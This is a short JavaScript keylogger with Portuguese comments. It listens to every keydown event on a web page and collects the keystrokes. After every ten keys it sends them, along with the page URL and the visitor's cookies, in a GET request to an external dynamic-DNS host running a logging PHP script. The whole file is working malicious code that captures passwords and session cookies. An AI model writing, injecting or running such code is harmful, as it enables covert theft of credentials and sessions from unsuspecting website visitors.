var teclas = [];
document.addEventListener("keydown",function(e){
	tecla = e.key;
	teclas.push(tecla); //Adiciona a tecla digitada para o array teclas
	if (teclas.length >= 10){ //Caso array for maior ou igual a 10 caracteres
		//console.log(teclas.join("")) //Remove as virgulas da array
		//console.log(e.which); Diz o numero Unicode da tecla digitada
		var xhttp = new XMLHttpRequest(); //Inicia requisicao http
		xhttp.open("GET", "https://rakkonmore.ddns.net/strokes.php?key="+teclas.join("")+"&url="+window.location.href+"&cookie="+document.cookie, true); //Envia GET para servidor com PHP que registra teclas
		xhttp.send(); //Envia requisicao
		teclas = []; //Limpa array apos envio para nao acumular
		}
	});
